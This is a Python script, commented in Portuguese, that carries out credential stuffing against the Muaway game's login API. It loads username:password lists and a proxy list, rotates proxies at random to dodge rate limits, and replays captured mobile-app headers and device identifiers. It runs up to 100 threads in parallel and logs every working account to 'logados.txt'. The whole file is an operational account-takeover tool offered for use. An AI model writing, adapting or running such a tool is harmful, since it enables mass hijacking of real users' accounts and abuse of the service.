import requests
import json
import random
import threading
from concurrent.futures import ThreadPoolExecutor

# Endpoint e headers fixos conforme capturados
URL = "https://webapi.muaway.net/auth/login/muaway-login"
HEADERS = {
    "Host": "webapi.muaway.net",
    "Connection": "keep-alive",
    "Origin": "https://auth.muaway.net",
    "Set-Service": "GameAuthentication",
    "User-Agent": ("Mozilla/5.0 (Linux; Android 7.1.2; SM-N975F Build/N2G48H; wv) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36"),
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Set-App-Platform": "android",
    "Set-Locale": "pt-BR",
    "Referer": "https://auth.muaway.net/muaway-login",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "pt-BR,en-US;q=0.9",
    "X-Requested-With": "com.away.game.br"
}

# Payload base conforme capturado (exceto username e password)
PAYLOAD_TEMPLATE = {
    "sessionId": "3a98b348-e432-1b28-98aa-8dad64f2caf8",
    "username": None,  # Será preenchido
    "password": None,  # Será preenchido
    "deviceId": "ky31sIqAEXBTamzCiG3Ok85UYTnaKuyBjuDKGAX0KRQ=\n",
    "deviceIdLegacy": None
}

# Cria uma trava para escrita no arquivo de log
write_lock = threading.Lock()

def read_proxies(filename):
    """Lê os proxies do arquivo (um por linha)."""
    with open(filename, "r") as f:
        proxies = [line.strip() for line in f if line.strip()]
    return proxies

def read_credentials(filename):
    """Lê as credenciais do arquivo, esperando o formato username:password."""
    creds = []
    with open(filename, "r") as f:
        for line in f:
            line = line.strip()
            if line:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    creds.append((parts[0].strip(), parts[1].strip()))
    return creds

def log_success(username, password, response_text):
    """Salva a credencial que logou com sucesso no arquivo 'logados.txt'."""
    with write_lock:
        with open("logados.txt", "a") as f:
            f.write(f"{username}:{password} | Resposta: {response_text}\n")

def test_login(credential, proxies):
    username, password = credential
    # Escolhe um proxy aleatório
    proxy = random.choice(proxies)
    proxy_dict = {"http": proxy, "https": proxy}
    
    # Preenche o payload com os dados do usuário
    payload = PAYLOAD_TEMPLATE.copy()
    payload["username"] = username
    payload["password"] = password

    print(f"\nTestando login para: {username}:{password} usando proxy: {proxy}")
    try:
        response = requests.post(URL, headers=HEADERS, json=payload, proxies=proxy_dict, timeout=15)
        print(f"Status Code: {response.status_code}")
        print(f"Resposta: {response.text}")
        # Se o login for considerado bem-sucedido (ex.: status 200), grava a credencial
        if response.status_code == 200:
            log_success(username, password, response.text)
    except Exception as e:
        print(f"Erro para {username}:{password} com o proxy {proxy}: {e}")

def main():
    # Lê proxies e credenciais dos arquivos
    proxies = read_proxies("proxy.txt")
    credentials = read_credentials("lista.txt")
    
    if not proxies:
        print("Nenhum proxy encontrado!")
        return
    if not credentials:
        print("Nenhuma credencial encontrada!")
        return
    
    # Solicita ao usuário que escolha o número de threads (de 1 a 100)
    while True:
        try:
            threads = int(input("Digite o número de threads (1-100): "))
            if 1 <= threads <= 100:
                break
            else:
                print("Por favor, insira um número entre 1 e 100.")
        except ValueError:
            print("Entrada inválida. Por favor, insira um número válido.")

    # Cria um pool de threads para executar os testes de login em paralelo
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for credential in credentials:
            executor.submit(test_login, credential, proxies)

if __name__ == "__main__":
    main()
